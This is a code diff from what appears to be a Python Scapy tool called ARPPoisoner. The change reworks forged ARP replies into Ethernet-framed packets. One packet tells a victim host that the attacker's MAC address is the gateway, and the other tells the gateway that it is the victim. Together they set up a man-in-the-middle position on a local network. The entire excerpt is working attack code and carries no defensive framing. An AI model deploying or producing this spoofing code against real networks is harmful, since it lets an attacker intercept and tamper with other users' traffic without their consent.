@@ -62,21 +62,27 @@ class ARPPoisoner:
                 return
 
             # Tell the victim that we are the gateway.
-            victim_arp_poison = ARP(
-                op=2,  # ARP reply
-                pdst=self.victim_ip,  # Destination is the victim
-                hwdst=victim_mac,
-                psrc=self.gateway_ip,  # Source is the gateway (we claim that)
-                hwsrc=self.attacker_mac  # But actually we send our own MAC address.
+            victim_arp_poison = (
+                sc.Ether(dst=victim_mac) /
+                ARP(
+                    op=2,                     # ARP reply (is-at)
+                    pdst=self.victim_ip,      # Victim IP
+                    hwdst=victim_mac,         # Victim MAC
+                    psrc=self.gateway_ip,     # Claim to be gateway
+                    hwsrc=self.attacker_mac   # Our MAC
+                )
             )
 
-            # Same for the gateway
-            gateway_arp_poison = ARP(
-                op=2,  # ARP reply
-                pdst=self.gateway_ip,  # Destination is the gateway
-                hwdst=gateway_mac,
-                psrc=self.victim_ip,  # Source is the victim (we claim that)
-                hwsrc=self.attacker_mac  # But actually we send our own MAC address
+            # Tell the gateway that we are the victim
+            gateway_arp_poison = (
+                sc.Ether(dst=gateway_mac) /
+                ARP(
+                    op=2,                     # ARP reply
+                    pdst=self.gateway_ip,     # Gateway IP
+                    hwdst=gateway_mac,        # Gateway MAC
+                    psrc=self.victim_ip,      # Claim to be victim
+                    hwsrc=self.attacker_mac   # Our MAC
+                )
             )
 
             # Send the poisoned packets
